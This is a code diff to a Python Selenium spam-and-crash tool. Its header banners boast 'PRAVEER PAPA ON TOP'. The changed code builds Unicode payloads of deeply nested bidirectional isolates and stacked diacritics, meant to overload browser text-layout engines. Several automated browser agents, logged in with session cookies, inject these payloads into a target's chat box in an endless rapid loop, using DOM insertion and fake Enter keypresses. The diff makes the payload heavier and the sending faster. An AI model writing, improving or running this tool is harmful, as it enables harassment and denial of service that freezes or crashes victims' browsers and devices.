@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (STACK-OVERFLOW V67)
-# 📅 STATUS: HARFBUZZ-RECURSION-MAX | 4-AGENT TOTAL | AWS-CPU-KILL
+# 🚀 PROJECT: PRAVEER.OWNS (STACK-NUKE V68)
+# 📅 STATUS: HARFBUZZ-STACK-OVERFLOW | 4-AGENT TOTAL | AWS-CPU-MAX
 
 import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
 from concurrent.futures import ThreadPoolExecutor
@@ -12,37 +12,34 @@ from selenium.webdriver.chrome.options import Options
 # --- 4 AGENTS TOTAL CONFIG ---
 AGENTS_PER_MACHINE = 2             
 TOTAL_DURATION = 25000 
-BURST_SPEED = (0.1, 0.3)    # 🔥 Rapid Fire
-REST_AFTER_STRIKES = 180   
-REST_DURATION = 3          
+BURST_SPEED = (0.05, 0.2)   # 🔥 MAXIMUM INJECTION SPEED
+REST_AFTER_STRIKES = 200   
+REST_DURATION = 2          
 
 GLOBAL_SENT = 0
 COUNTER_LOCK = threading.Lock()
 BROWSER_LAUNCH_LOCK = threading.Lock()
 
-def get_stack_overflow_payload():
-    """Generates a payload targeting HarfBuzz recursion and BiDi stack limits."""
-    u_id = random.randint(1000, 9999)
+def get_stack_nuke_payload():
+    """Generates a payload targeting the recursive limits of the layout engine."""
+    u_id = random.randint(100, 999)
     
-    # \u2066 = LRI | \u2067 = RLI | \u2068 = FSI | \u2069 = PDI
-    # \u0300-\u036F = Combining marks (Diacritics)
-    lri, rli, fsi, pdi = "\u2066", "\u2067", "\u2068", "\u2069"
-    marks = "".join([chr(i) for i in range(0x0300, 0x0350)]) # 80 stacked marks
+    # \u2066 = LRI | \u2067 = RLI | \u2069 = PDI (Isolates)
+    # \u0300-\u036F = Combining Marks (Diacritics) - Stacking 100 deep
+    lri, rli, pdi = "\u2066", "\u2067", "\u2069"
+    marks = "".join([chr(i) for i in range(0x0300, 0x0364)]) 
     glue = "\u2060" # Word Joiner
     
-    header = f"👑 PRAVEER PAPA ON TOP 🌙 [HARD_LOCK:{u_id}]"
+    header = f"👑 PRAVEER PAPA ON TOP 🌙 [STACK_NUKE:{u_id}]"
     
     body = []
-    # 400 lines of 'Recursive Layout Thrashing'
+    # 400 lines of 'Recursive Stack Thrashing'
     for i in range(400):
-        # We nest isolates 8 levels deep. 
-        # Every level flip-flops the text direction, forcing the CPU to 
-        # re-calculate the entire 'shaping' path for every character.
-        nest = f"{lri}{rli}{fsi}" * 3 # 9 layers deep
-        pop = f"{pdi}" * 9
-        
-        # We combine 'PRAVEER' with 80 diacritics and the directional nest
-        line = f"{nest}P{marks}R{marks}A{marks}V{marks}EER{pop}🌙{i}{glue*6}"
+        # We nest isolates 12 levels deep per line.
+        # This forces the browser to open 12 new 'Rendering Contexts' per word.
+        nest = f"{lri}{rli}" * 6
+        pop = f"{pdi}" * 12
+        line = f"{nest}P{marks}R{marks}A{marks}V{marks}E{marks}ER{pop} 🌙 {i}{glue*8}"
         body.append(line)
         
     return f"{header}\n{glue.join(body)}".strip()[:9998]
@@ -64,20 +61,16 @@ def get_driver(agent_id):
         return driver
 
 def atomic_dispatch_send(driver, text):
-    """Direct DOM injection that clears the input state before firing."""
+    """Direct DOM injection with hardware-event spoofing."""
     try:
         driver.execute_script("""
             var box = document.querySelector('div[role="textbox"], textarea');
             if (box) {
                 box.focus();
-                // Clear any potential 'Typing' hang from previous failures
                 document.execCommand('selectAll', false, null);
                 document.execCommand('delete', false, null);
-                // Inject the Nuclear Payload
                 document.execCommand('insertText', false, arguments[0]);
-                // Sync Internal React State
                 box.dispatchEvent(new Event('input', { bubbles: true }));
-                // Fire Trusted Enter Dispatch
                 var e = new KeyboardEvent('keydown', {
                     key: 'Enter', code: 'Enter', keyCode: 13, which: 13, 
                     bubbles: true, cancelable: true
@@ -99,7 +92,7 @@ def run_life_cycle(agent_id, cookie, target):
             
             strike_count = 0
             while True:
-                payload = get_stack_overflow_payload()
+                payload = get_stack_nuke_payload()
                 if atomic_dispatch_send(driver, payload):
                     strike_count += 1
                     with COUNTER_LOCK:
